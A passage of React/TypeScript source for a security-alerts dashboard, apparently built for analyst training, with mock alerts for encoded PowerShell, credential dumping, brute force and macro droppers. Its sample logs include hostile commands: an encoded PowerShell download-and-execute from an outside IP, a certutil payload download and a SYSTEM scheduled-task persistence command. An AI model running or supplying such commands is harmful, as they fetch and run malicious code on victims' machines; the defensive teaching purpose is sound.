import Navbar from "@/components/Navbar";
import SOCSidebar from "@/components/soc/SOCSidebar";
import { Bell, Search, User, Filter, Clock, Monitor, Globe, AlertTriangle, Shield, Eye, CheckCircle, XCircle, ChevronRight, Zap, Activity, RefreshCw, Play, ThumbsUp, ThumbsDown, X, FileText, Lightbulb, Terminal, ChevronDown } from "lucide-react";
import { cn } from "@/lib/utils";
import { useState } from "react";

interface Alert {
  id: string;
  title: string;
  description: string;
  severity: "Critical" | "High" | "Medium" | "Low";
  logSource: string;
  hostname: string;
  username: string;
  mitreTechnique: string;
  mitreId: string;
  timestamp: string;
  status: "Open" | "Investigating" | "Closed";
  relatedLogs: string[];
  investigationHints: string[];
  rawLog: string;
}

const alertsData: Alert[] = [
  {
    id: "ALT-2026-0847",
    title: "Suspicious PowerShell Execution with Encoded Command",
    description: "A PowerShell process was spawned with a Base64-encoded command and execution policy bypass flag (-ep bypass -enc). This behavior is commonly associated with fileless malware, living-off-the-land techniques, and post-exploitation frameworks such as Cobalt Strike and Empire.",
    severity: "Critical",
    logSource: "Sysmon",
    hostname: "WKS-PC-0127",
    username: "jsmith",
    mitreTechnique: "Command and Scripting Interpreter: PowerShell",
    mitreId: "T1059.001",
    timestamp: "2026-01-21 14:32:18",
    status: "Open",
    relatedLogs: [
      "Sysmon Event ID 1 — Process Creation: powershell.exe -ep bypass -enc aQBlAHgA...",
      "Sysmon Event ID 3 — Network Connection: powershell.exe → 185.220.101.34:443",
      "Windows Security Event 4688 — New Process Created: powershell.exe (Parent: winword.exe)",
    ],
    investigationHints: [
      "Decode the Base64 string in the -enc parameter to reveal the actual PowerShell script.",
      "Check the parent process — if it's winword.exe or excel.exe, this may indicate a macro-based initial access.",
      "Look for subsequent Sysmon Event ID 3 (Network Connection) from powershell.exe to identify C2 communication.",
      "Search for Event ID 4104 (Script Block Logging) for the full deobfuscated script content.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 14:32:18.442","ProcessGuid":"{8a5f2c1d-4e8b-65a7-f100-000000002200}","ProcessId":7284,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -ep bypass -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQALwBwAGEAeQBsAG8AYQBkACcAKQA=","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","User":"CORP\\\\jsmith","IntegrityLevel":"Medium"}`,
  },
  {
    id: "ALT-2026-0846",
    title: "Brute Force Attack — Multiple Failed Logins",
    description: "Five consecutive failed login attempts detected from a single source IP address within a 2-minute window targeting domain user account. This pattern is consistent with password brute-force or credential stuffing attacks.",
    severity: "High",
    logSource: "Windows Event Logs",
    hostname: "DC-01",
    username: "admin_svc",
    mitreTechnique: "Brute Force",
    mitreId: "T1110",
    timestamp: "2026-01-21 14:28:45",
    status: "Investigating",
    relatedLogs: [
      "Windows Security Event 4625 — Failed Logon (x5): Source IP 192.168.1.105, Target: admin_svc",
      "Windows Security Event 4776 — Credential Validation: NTLM auth failure for admin_svc",
      "Firewall Log: 192.168.1.105 → DC-01:445 SMB connection (repeated)",
    ],
    investigationHints: [
      "Check if the source IP 192.168.1.105 is a known internal host or potentially compromised endpoint.",
      "Look for Event ID 4624 (Successful Logon) after the failed attempts — this would indicate the brute force succeeded.",
      "Review the Logon Type field — Type 3 (Network) vs Type 10 (RDP) tells you the attack vector.",
      "Check if the targeted account 'admin_svc' is a service account with elevated privileges.",
    ],
    rawLog: `{"EventID":4625,"TimeCreated":"2026-01-21T14:28:45.123Z","Computer":"DC-01.corp.local","SubjectUserName":"-","TargetUserName":"admin_svc","TargetDomainName":"CORP","Status":"0xc000006d","SubStatus":"0xc000006a","LogonType":3,"IpAddress":"192.168.1.105","IpPort":"52847","WorkstationName":"UNKNOWN"}`,
  },
  {
    id: "ALT-2026-0845",
    title: "Large Outbound Data Transfer to External IP",
    description: "An internal host initiated a large data transfer (2.3 GB) to an external IP address not present in any threat intelligence whitelist. The transfer used HTTPS on a non-standard port, which is a common data exfiltration technique.",
    severity: "High",
    logSource: "Firewall",
    hostname: "WKS-PC-0042",
    username: "mwilliams",
    mitreTechnique: "Exfiltration Over C2 Channel",
    mitreId: "T1041",
    timestamp: "2026-01-21 14:25:12",
    status: "Open",
    relatedLogs: [
      "Firewall Log: 10.0.0.42 → 91.215.85.17:8443 (HTTPS) — 2.3 GB transferred",
      "DNS Log: Resolution for cdn-update-service.com → 91.215.85.17",
      "Proxy Log: CONNECT 91.215.85.17:8443 — User-Agent: Mozilla/5.0 (unusual string)",
    ],
    investigationHints: [
      "Check if the external IP 91.215.85.17 appears in threat intelligence feeds (VirusTotal, AbuseIPDB).",
      "Investigate the domain 'cdn-update-service.com' — is it a legitimate CDN or a C2 domain?",
      "Review the volume and timing of the transfer — was this during business hours or after?",
      "Check what files were accessed on WKS-PC-0042 prior to the transfer using Sysmon File Create events.",
    ],
    rawLog: `{"timestamp":"2026-01-21T14:25:12Z","src_ip":"10.0.0.42","dst_ip":"91.215.85.17","dst_port":8443,"protocol":"TCP","action":"ALLOW","bytes_sent":2368709120,"bytes_recv":45312,"duration":1847,"application":"ssl","rule":"outbound-https-allow"}`,
  },
  {
    id: "ALT-2026-0844",
    title: "New Windows Service Installed on Domain Controller",
    description: "A new Windows service named 'SysHealthMonitor' was installed on the domain controller with LocalSystem privileges. The service binary is located in a temp directory, which is highly suspicious for legitimate software installations.",
    severity: "Medium",
    logSource: "Windows Event Logs",
    hostname: "DC-01",
    username: "SYSTEM",
    mitreTechnique: "Create or Modify System Process: Windows Service",
    mitreId: "T1543.003",
    timestamp: "2026-01-21 14:22:33",
    status: "Closed",
    relatedLogs: [
      "Windows System Event 7045 — New Service: SysHealthMonitor, Path: C:\\Temp\\svcmon.exe",
      "Sysmon Event ID 11 — File Created: C:\\Temp\\svcmon.exe (SHA256: a3b4c5...)",
      "Sysmon Event ID 13 — Registry Value Set: HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysHealthMonitor",
    ],
    investigationHints: [
      "Check the hash of svcmon.exe against VirusTotal — a file in C:\\Temp is suspicious.",
      "Verify if 'SysHealthMonitor' is an approved service by checking the CMDB or change management system.",
      "Look at who installed the service — check Event ID 4688 for the parent process that created svcmon.exe.",
      "Review if the service has started and what network connections it has made (Sysmon Event ID 3).",
    ],
    rawLog: `{"EventID":7045,"TimeCreated":"2026-01-21T14:22:33.891Z","Computer":"DC-01.corp.local","ServiceName":"SysHealthMonitor","ImagePath":"C:\\\\Temp\\\\svcmon.exe","ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}`,
  },
  {
    id: "ALT-2026-0843",
    title: "Internal Port Scan Activity Detected",
    description: "Sequential port scanning activity detected from an internal host. The host probed ports 21, 22, 23, 80, 135, 139, 443, 445, 3389, 8080 across 14 internal hosts within a 30-second window.",
    severity: "Medium",
    logSource: "Firewall",
    hostname: "WKS-PC-0088",
    username: "jdoe",
    mitreTechnique: "Network Service Discovery",
    mitreId: "T1046",
    timestamp: "2026-01-21 14:18:56",
    status: "Open",
    relatedLogs: [
      "Firewall Log: 172.16.0.88 → Multiple internal IPs, Ports: 21,22,23,80,135,139,443,445,3389,8080",
      "IDS Alert: ET SCAN Potential Nmap SYN Scan from 172.16.0.88",
      "Sysmon Event ID 3 — Network Connection: nmap.exe → various destinations",
    ],
    investigationHints: [
      "Check if this is an authorized vulnerability scan — verify with the IT security team schedule.",
      "Look for the process responsible — is it nmap, masscan, or a custom tool?",
      "Determine if jdoe's account has been compromised — check for anomalous login activity.",
      "Review which ports responded as open — these are potential lateral movement targets.",
    ],
    rawLog: `{"timestamp":"2026-01-21T14:18:56Z","src_ip":"172.16.0.88","events":[{"dst_ip":"172.16.0.10","dst_port":445,"action":"ALLOW"},{"dst_ip":"172.16.0.10","dst_port":3389,"action":"DENY"},{"dst_ip":"172.16.0.11","dst_port":22,"action":"ALLOW"},{"dst_ip":"172.16.0.12","dst_port":80,"action":"ALLOW"}],"scan_type":"SYN","packets":847}`,
  },
  {
    id: "ALT-2026-0842",
    title: "Removable USB Storage Device Connected",
    description: "A USB mass storage device was connected to a workstation in the finance department. The device is not registered in the organization's approved hardware whitelist and may pose a data loss risk.",
    severity: "Low",
    logSource: "Sysmon",
    hostname: "WKS-FIN-003",
    username: "abrown",
    mitreTechnique: "Replication Through Removable Media",
    mitreId: "T1091",
    timestamp: "2026-01-21 14:15:21",
    status: "Closed",
    relatedLogs: [
      "Sysmon Event ID 6 — Driver Loaded: USBSTOR\\DISK&VEN_KINGSTON&PROD_DATATRAVELER",
      "Windows Security Event 6416 — New External Device Recognized",
      "DLP Log: File Copy Detected — Q4-Financial-Report.xlsx → E:\\",
    ],
    investigationHints: [
      "Check DLP logs for any sensitive files copied to the USB device.",
      "Verify if the user has authorization to use removable media per company policy.",
      "Look at the device serial number to determine if this is a known device or a new one.",
      "Review if any autorun or executable files were launched from the USB.",
    ],
    rawLog: `{"EventID":6,"UtcTime":"2026-01-21 14:15:21.003","ImageLoaded":"C:\\\\Windows\\\\System32\\\\drivers\\\\USBSTOR.SYS","Hashes":"SHA256:b2c8f7d3a1e94...","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","DeviceInfo":"USBSTOR\\\\DISK&VEN_KINGSTON&PROD_DATATRAVELER&REV_1.0"}`,
  },
  {
    id: "ALT-2026-0841",
    title: "DNS Query to Known Malicious Domain",
    description: "A DNS resolution request was made to a domain flagged in multiple threat intelligence feeds as associated with command and control (C2) infrastructure for the APT29 threat group.",
    severity: "High",
    logSource: "Firewall",
    hostname: "WKS-PC-0156",
    username: "klee",
    mitreTechnique: "Application Layer Protocol: DNS",
    mitreId: "T1071.004",
    timestamp: "2026-01-21 14:12:09",
    status: "Investigating",
    relatedLogs: [
      "DNS Log: WKS-PC-0156 → update-check-srv.xyz (A Record) → 45.77.65.211",
      "Proxy Log: BLOCKED connection to 45.77.65.211:443 from WKS-PC-0156",
      "Sysmon Event ID 22 — DNS Query: rundll32.exe queried update-check-srv.xyz",
    ],
    investigationHints: [
      "The querying process is rundll32.exe — this is commonly abused for DLL side-loading.",
      "Check what DLL was loaded by rundll32 using Sysmon Event ID 7 (Image Loaded).",
      "Verify if the connection was blocked by the proxy — if not, C2 may be established.",
      "Search for the domain 'update-check-srv.xyz' in threat intel platforms for attribution.",
    ],
    rawLog: `{"EventID":22,"UtcTime":"2026-01-21 14:12:09.117","ProcessGuid":"{8a5f2c1d-5f2a-65a7-2d00-000000002200}","ProcessId":4892,"QueryName":"update-check-srv.xyz","QueryType":"A","QueryStatus":"0","QueryResults":"45.77.65.211","Image":"C:\\\\Windows\\\\System32\\\\rundll32.exe"}`,
  },
  {
    id: "ALT-2026-0840",
    title: "Scheduled Task Created with SYSTEM Privileges",
    description: "A new scheduled task was created that runs with SYSTEM-level privileges. The task is configured to execute a script from a user's AppData directory on system startup, which is a common persistence mechanism.",
    severity: "Medium",
    logSource: "Windows Event Logs",
    hostname: "WKS-PC-0078",
    username: "rjohnson",
    mitreTechnique: "Scheduled Task/Job: Scheduled Task",
    mitreId: "T1053.005",
    timestamp: "2026-01-21 14:08:44",
    status: "Open",
    relatedLogs: [
      "Windows Security Event 4698 — Scheduled Task Created: \\Microsoft\\Windows\\UpdateCheck",
      "Sysmon Event ID 1 — schtasks.exe /create /tn UpdateCheck /sc onstart /ru SYSTEM",
      "Sysmon Event ID 11 — File Created: C:\\Users\\rjohnson\\AppData\\Local\\Temp\\updchk.ps1",
    ],
    investigationHints: [
      "Review the contents of updchk.ps1 — does it download or execute anything from external sources?",
      "Check why a regular user (rjohnson) is creating tasks that run as SYSTEM — this requires elevated privileges.",
      "Look for Event ID 4672 (Special Privileges Assigned) to see if the user has admin tokens.",
      "Verify if 'UpdateCheck' is a legitimate Windows task or an attacker-created persistence mechanism.",
    ],
    rawLog: `{"EventID":4698,"TimeCreated":"2026-01-21T14:08:44.556Z","Computer":"WKS-PC-0078.corp.local","SubjectUserName":"rjohnson","TaskName":"\\\\Microsoft\\\\Windows\\\\UpdateCheck","TaskContent":"<Actions><Exec><Command>powershell.exe</Command><Arguments>-File C:\\\\Users\\\\rjohnson\\\\AppData\\\\Local\\\\Temp\\\\updchk.ps1</Arguments></Exec></Actions>","RunAs":"NT AUTHORITY\\\\SYSTEM","Trigger":"AtStartup"}`,
  },
  {
    id: "ALT-2026-0839",
    title: "LSASS Memory Access — Credential Dumping",
    description: "A non-standard process accessed LSASS (Local Security Authority Subsystem Service) memory. This technique is used by tools like Mimikatz to extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory.",
    severity: "Critical",
    logSource: "EDR",
    hostname: "WKS-PC-0089",
    username: "SYSTEM",
    mitreTechnique: "OS Credential Dumping: LSASS Memory",
    mitreId: "T1003.001",
    timestamp: "2026-01-21 13:55:32",
    status: "Investigating",
    relatedLogs: [
      "Sysmon Event ID 10 — Process Accessed: notepad.exe → lsass.exe (GrantedAccess: 0x1010)",
      "EDR Alert: Suspicious LSASS access from PID 5544 (notepad.exe) — Mimikatz signature detected",
      "Windows Security Event 4663 — Object Access: lsass.exe memory read by notepad.exe",
    ],
    investigationHints: [
      "notepad.exe accessing LSASS is highly abnormal — this is likely a process injection or renamed binary.",
      "Check the hash of the 'notepad.exe' binary — is it the legitimate Windows notepad or a renamed tool?",
      "Look for Sysmon Event ID 8 (CreateRemoteThread) which indicates process injection into notepad.exe.",
      "Immediately check if any credentials were used for lateral movement after this event (Event ID 4624, Type 3).",
    ],
    rawLog: `{"EventID":10,"UtcTime":"2026-01-21 13:55:32.998","SourceProcessGuid":"{8a5f2c1d-3a1c-65a7-8800-000000002200}","SourceProcessId":5544,"SourceImage":"C:\\\\Windows\\\\System32\\\\notepad.exe","TargetProcessId":672,"TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010","CallTrace":"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9d4c4|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2c13e"}`,
  },
  {
    id: "ALT-2026-0838",
    title: "Macro-Enabled Document Spawned cmd.exe",
    description: "Microsoft Word spawned a cmd.exe child process, indicating a macro was executed. This is a classic initial access technique where malicious documents deliver payloads through VBA macros.",
    severity: "High",
    logSource: "Sysmon",
    hostname: "WKS-PC-0156",
    username: "mgarcia",
    mitreTechnique: "User Execution: Malicious File",
    mitreId: "T1204.002",
    timestamp: "2026-01-21 13:42:17",
    status: "Open",
    relatedLogs: [
      "Sysmon Event ID 1 — Process Creation: cmd.exe (Parent: WINWORD.EXE)",
      "Sysmon Event ID 15 — File Stream Created: Invoice-Q4-2025.docm:Zone.Identifier",
      "Sysmon Event ID 1 — cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe",
    ],
    investigationHints: [
      "The document 'Invoice-Q4-2025.docm' is a macro-enabled file — check where it was downloaded from.",
      "cmd.exe using certutil for downloading is a known LOLBin technique (T1105).",
      "Check if payload.exe was successfully downloaded and executed on the host.",
      "Look at the email gateway logs to find the original phishing email that delivered this document.",
    ],
    rawLog: `{"EventID":1,"UtcTime":"2026-01-21 13:42:17.224","ProcessGuid":"{8a5f2c1d-2b8e-65a7-5400-000000002200}","ProcessId":8812,"Image":"C:\\\\Windows\\\\System32\\\\cmd.exe","CommandLine":"cmd.exe /c certutil -urlcache -split -f http://91.215.85.17/payload.exe C:\\\\Users\\\\mgarcia\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE","ParentCommandLine":"WINWORD.EXE /n Invoice-Q4-2025.docm","User":"CORP\\\\mgarcia"}`,
  },
];

const severityConfig = {
  Critical: { dot: "bg-red-500", text: "text-red-400", bg: "bg-red-500/10", border: "border-red-500/20", label: "CRITICAL" },
  High: { dot: "bg-orange-500", text: "text-orange-400", bg: "bg-orange-500/10", border: "border-orange-500/20", label: "HIGH" },
  Medium: { dot: "bg-yellow-500", text: "text-yellow-400", bg: "bg-yellow-500/10", border: "border-yellow-500/20", label: "MEDIUM" },
  Low: { dot: "bg-blue-500", text: "text-blue-400", bg: "bg-blue-500/10", border: "border-blue-500/20", label: "LOW" },
};

const statusConfig = {
  Open: { icon: Zap, text: "text-red-400", bg: "bg-red-500/10", border: "border-red-500/20" },
  Investigating: { icon: Activity, text: "text-yellow-400", bg: "bg-yellow-500/10", border: "border-yellow-500/20" },
  Closed: { icon: CheckCircle, text: "text-muted-foreground", bg: "bg-muted/30", border: "border-border" },
};

const logSources = ["All Sources", "Windows Event Logs", "Sysmon", "Firewall", "EDR"];

const Alerts = () => {
  const [selectedSeverity, setSelectedSeverity] = useState<string>("all");
  const [selectedStatus, setSelectedStatus] = useState<string>("all");
  const [selectedSource, setSelectedSource] = useState<string>("All Sources");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedAlert, setSelectedAlert] = useState<Alert | null>(null);
  const [timeRange, setTimeRange] = useState("24h");

  const filteredAlerts = alertsData.filter(alert => {
    const matchesSeverity = selectedSeverity === "all" || alert.severity === selectedSeverity;
    const matchesStatus = selectedStatus === "all" || alert.status === selectedStatus;
    const matchesSource = selectedSource === "All Sources" || alert.logSource === selectedSource;
    const matchesSearch = !searchQuery || [alert.title, alert.description, alert.hostname, alert.id, alert.username, alert.mitreId].some(f => f.toLowerCase().includes(searchQuery.toLowerCase()));
    return matchesSeverity && matchesStatus && matchesSource && matchesSearch;
  });

  const counts = {
    total: alertsData.length,
    critical: alertsData.filter(a => a.severity === "Critical").length,
    high: alertsData.filter(a => a.severity === "High").length,
    medium: alertsData.filter(a => a.severity === "Medium").length,
    low: alertsData.filter(a => a.severity === "Low").length,
    open: alertsData.filter(a => a.status === "Open").length,
  };

  return (
    <main className="min-h-screen bg-background flex flex-col">
      <Navbar />
      <div className="flex flex-1 pt-20 overflow-hidden">
        <SOCSidebar activeItem="Alerts" />

        <div className="flex-1 flex flex-col min-w-0">
          {/* Top Header Bar */}
          <header className="bg-card/30 backdrop-blur-lg border-b border-border px-6 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center">
                  <AlertTriangle className="w-4 h-4 text-red-400" />
                </div>
                <div>
                  <h1 className="text-lg font-semibold text-foreground">Security Alerts</h1>
                  <p className="text-xs text-muted-foreground">Monitor, triage, and investigate security events</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <span className="flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-mono">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                  {counts.open} Open Alerts
                </span>
                <button className="p-2 text-muted-foreground hover:text-foreground transition-colors rounded-lg hover:bg-muted/30">
                  <RefreshCw className="w-4 h-4" />
                </button>
              </div>
            </div>
          </header>

          {/* Filters Bar */}
          <div className="bg-card/15 border-b border-border px-6 py-3 flex flex-wrap items-center gap-3">
            {/* Search */}
            <div className="relative flex-1 min-w-[200px] max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search by alert ID, title, hostname, username, MITRE ID..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-background/60 border border-border rounded-md pl-10 pr-4 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-1 focus:ring-primary/25 transition-colors"
              />
            </div>

            {/* Severity Filter */}
            <div className="flex items-center gap-1 bg-background/40 rounded-md border border-border p-0.5">
              {[
                { key: "all", label: "All", count: counts.total },
                { key: "Critical", label: "Crit", count: counts.critical },
                { key: "High", label: "High", count: counts.high },
                { key: "Medium", label: "Med", count: counts.medium },
                { key: "Low", label: "Low", count: counts.low },
              ].map(f => (
                <button
                  key={f.key}
                  onClick={() => setSelectedSeverity(f.key)}
                  className={cn(
                    "flex items-center gap-1.5 px-2.5 py-1.5 rounded text-xs font-medium transition-all",
                    selectedSeverity === f.key
                      ? "bg-muted text-foreground"
                      : "text-muted-foreground hover:text-foreground"
                  )}
                >
                  {f.key !== "all" && (
                    <span className={cn("w-2 h-2 rounded-full", severityConfig[f.key as keyof typeof severityConfig]?.dot)} />
                  )}
                  {f.label}
                  <span className="text-[10px] font-mono opacity-60">{f.count}</span>
                </button>
              ))}
            </div>

            {/* Status Filter */}
            <select
              value={selectedStatus}
              onChange={(e) => setSelectedStatus(e.target.value)}
              className="bg-background/60 border border-border rounded-md px-3 py-2 text-xs text-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              <option value="all">All Status</option>
              <option value="Open">Open</option>
              <option value="Investigating">Investigating</option>
              <option value="Closed">Closed</option>
            </select>

            {/* Log Source Filter */}
            <select
              value={selectedSource}
              onChange={(e) => setSelectedSource(e.target.value)}
              className="bg-background/60 border border-border rounded-md px-3 py-2 text-xs text-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              {logSources.map(s => (
                <option key={s} value={s}>{s}</option>
              ))}
            </select>

            {/* Time Range */}
            <select
              value={timeRange}
              onChange={(e) => setTimeRange(e.target.value)}
              className="bg-background/60 border border-border rounded-md px-3 py-2 text-xs text-foreground focus:outline-none focus:border-primary/50 cursor-pointer"
            >
              <option value="1h">Last 1 Hour</option>
              <option value="6h">Last 6 Hours</option>
              <option value="24h">Last 24 Hours</option>
              <option value="7d">Last 7 Days</option>
              <option value="30d">Last 30 Days</option>
            </select>
          </div>

          {/* Main Content Area */}
          <div className="flex-1 flex overflow-hidden">
            {/* Alert Table */}
            <div className={cn("flex-1 flex flex-col overflow-hidden transition-all", selectedAlert ? "lg:w-1/2" : "w-full")}>
              {/* Table header info */}
              <div className="px-6 py-2 flex items-center justify-between bg-background/30 border-b border-border">
                <span className="text-xs text-muted-foreground">
                  Showing <span className="text-foreground font-medium">{filteredAlerts.length}</span> of {alertsData.length} alerts
                </span>
                <span className="text-xs text-muted-foreground flex items-center gap-1">
                  <Clock className="w-3 h-3" />
                  Auto-refresh: 30s
                </span>
              </div>

              {/* Table */}
              <div className="flex-1 overflow-auto">
                <table className="w-full text-sm">
                  <thead className="sticky top-0 z-10">
                    <tr className="bg-card/60 backdrop-blur-sm border-b border-border text-[11px] text-muted-foreground uppercase tracking-wider">
                      <th className="text-left px-4 py-2.5 font-medium w-[70px]">Sev</th>
                      <th className="text-left px-3 py-2.5 font-medium">Alert ID</th>
                      <th className="text-left px-3 py-2.5 font-medium">Alert Title</th>
                      <th className="text-left px-3 py-2.5 font-medium hidden xl:table-cell">Log Source</th>
                      <th className="text-left px-3 py-2.5 font-medium hidden lg:table-cell">Hostname</th>
                      <th className="text-left px-3 py-2.5 font-medium hidden xl:table-cell">User</th>
                      <th className="text-left px-3 py-2.5 font-medium hidden lg:table-cell">MITRE ATT&CK</th>
                      <th className="text-left px-3 py-2.5 font-medium hidden md:table-cell">Timestamp</th>
                      <th className="text-left px-3 py-2.5 font-medium">Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredAlerts.map((alert) => {
                      const sev = severityConfig[alert.severity];
                      const stat = statusConfig[alert.status];
                      const StatusIcon = stat.icon;
                      const isSelected = selectedAlert?.id === alert.id;

                      return (
                        <tr
                          key={alert.id}
                          onClick={() => setSelectedAlert(isSelected ? null : alert)}
                          className={cn(
                            "border-b border-border/50 cursor-pointer transition-colors",
                            isSelected
                              ? "bg-primary/5 border-l-2 border-l-primary"
                              : "hover:bg-muted/20 border-l-2 border-l-transparent"
                          )}
                        >
                          <td className="px-4 py-3">
                            <span className={cn(
                              "inline-flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-bold uppercase tracking-wide border",
                              sev.bg, sev.text, sev.border
                            )}>
                              <span className={cn("w-1.5 h-1.5 rounded-full", sev.dot)} />
                              {alert.severity === "Critical" ? "CRIT" : alert.severity === "Medium" ? "MED" : alert.severity.toUpperCase()}
                            </span>
                          </td>
                          <td className="px-3 py-3">
                            <span className="text-xs font-mono text-muted-foreground">{alert.id}</span>
                          </td>
                          <td className="px-3 py-3">
                            <span className={cn("text-sm font-medium truncate block max-w-[280px]", isSelected ? "text-primary" : "text-foreground")}>
                              {alert.title}
                            </span>
                          </td>
                          <td className="px-3 py-3 hidden xl:table-cell">
                            <span className="text-xs text-muted-foreground px-2 py-0.5 rounded bg-muted/30 border border-border">
                              {alert.logSource}
                            </span>
                          </td>
                          <td className="px-3 py-3 hidden lg:table-cell">
                            <span className="text-xs font-mono text-muted-foreground">{alert.hostname}</span>
                          </td>
                          <td className="px-3 py-3 hidden xl:table-cell">
                            <span className="text-xs text-muted-foreground">{alert.username}</span>
                          </td>
                          <td className="px-3 py-3 hidden lg:table-cell">
                            <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-primary/8 border border-primary/15 text-primary">
                              {alert.mitreId}
                            </span>
                          </td>
                          <td className="px-3 py-3 hidden md:table-cell">
                            <span className="text-xs font-mono text-muted-foreground">{alert.timestamp}</span>
                          </td>
                          <td className="px-3 py-3">
                            <span className={cn("inline-flex items-center gap-1 text-[11px] font-medium px-2 py-0.5 rounded border", stat.bg, stat.text, stat.border)}>
                              <StatusIcon className="w-3 h-3" />
                              {alert.status}
                            </span>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>

                {filteredAlerts.length === 0 && (
                  <div className="text-center py-16">
                    <AlertTriangle className="w-10 h-10 text-muted-foreground/30 mx-auto mb-3" />
                    <h3 className="text-foreground font-medium mb-1">No alerts match your filters</h3>
                    <p className="text-sm text-muted-foreground">Try adjusting your filter criteria</p>
                  </div>
                )}
              </div>
            </div>

            {/* Investigation Detail Panel */}
            {selectedAlert && (
              <div className="hidden lg:flex w-[480px] xl:w-[540px] flex-col border-l border-border bg-card/20 backdrop-blur-sm overflow-hidden">
                {/* Panel Header */}
                <div className="px-5 py-3 border-b border-border flex items-center justify-between bg-card/40">
                  <div className="flex items-center gap-2.5">
                    <div className={cn("w-3 h-3 rounded-full", severityConfig[selectedAlert.severity].dot)} />
                    <h2 className="text-sm font-semibold text-foreground">Alert Investigation</h2>
                  </div>
                  <button
                    onClick={() => setSelectedAlert(null)}
                    className="p-1.5 text-muted-foreground hover:text-foreground hover:bg-muted/30 rounded-md transition-colors"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                {/* Panel Content */}
                <div className="flex-1 overflow-auto">
                  {/* Alert Overview */}
                  <div className="px-5 py-4 border-b border-border/50">
                    <div className="flex items-center gap-2 mb-2">
                      <span className={cn("px-2 py-0.5 rounded text-[10px] font-bold uppercase border", severityConfig[selectedAlert.severity].bg, severityConfig[selectedAlert.severity].text, severityConfig[selectedAlert.severity].border)}>
                        {selectedAlert.severity}
                      </span>
                      <span className="text-xs font-mono text-muted-foreground">{selectedAlert.id}</span>
                    </div>
                    <h3 className="text-base font-semibold text-foreground mb-2">{selectedAlert.title}</h3>
                    <p className="text-sm text-muted-foreground leading-relaxed">{selectedAlert.description}</p>
                  </div>

                  {/* Metadata Grid */}
                  <div className="px-5 py-4 border-b border-border/50">
                    <div className="grid grid-cols-2 gap-3">
                      <MetaField label="Log Source" value={selectedAlert.logSource} />
                      <MetaField label="Hostname" value={selectedAlert.hostname} mono />
                      <MetaField label="Username" value={selectedAlert.username} />
                      <MetaField label="Status" value={selectedAlert.status} />
                      <MetaField label="MITRE Technique" value={selectedAlert.mitreTechnique} />
                      <MetaField label="MITRE ID" value={selectedAlert.mitreId} mono />
                      <MetaField label="Timestamp" value={selectedAlert.timestamp} mono />
                    </div>
                  </div>

                  {/* Related Logs */}
                  <div className="px-5 py-4 border-b border-border/50">
                    <div className="flex items-center gap-2 mb-3">
                      <FileText className="w-4 h-4 text-primary" />
                      <h4 className="text-sm font-semibold text-foreground">Related Logs</h4>
                    </div>
                    <div className="space-y-2">
                      {selectedAlert.relatedLogs.map((log, i) => (
                        <div key={i} className="px-3 py-2 bg-background/60 rounded-md border border-border/50 text-xs font-mono text-muted-foreground leading-relaxed">
                          {log}
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Investigation Hints */}
                  <div className="px-5 py-4 border-b border-border/50">
                    <div className="flex items-center gap-2 mb-3">
                      <Lightbulb className="w-4 h-4 text-yellow-400" />
                      <h4 className="text-sm font-semibold text-foreground">Investigation Hints</h4>
                    </div>
                    <div className="space-y-2">
                      {selectedAlert.investigationHints.map((hint, i) => (
                        <div key={i} className="flex gap-2.5 px-3 py-2 bg-yellow-500/5 rounded-md border border-yellow-500/10">
                          <span className="text-yellow-400 text-xs font-bold mt-0.5 shrink-0">{i + 1}.</span>
                          <span className="text-xs text-muted-foreground leading-relaxed">{hint}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Raw Log Data */}
                  <div className="px-5 py-4 border-b border-border/50">
                    <div className="flex items-center gap-2 mb-3">
                      <Terminal className="w-4 h-4 text-primary" />
                      <h4 className="text-sm font-semibold text-foreground">Raw Log</h4>
                    </div>
                    <pre className="px-3 py-3 bg-background rounded-md border border-border text-[11px] font-mono text-muted-foreground overflow-x-auto whitespace-pre-wrap break-all leading-relaxed max-h-48">
                      {JSON.stringify(JSON.parse(selectedAlert.rawLog), null, 2)}
                    </pre>
                  </div>
                </div>

                {/* Action Buttons — Fixed at bottom */}
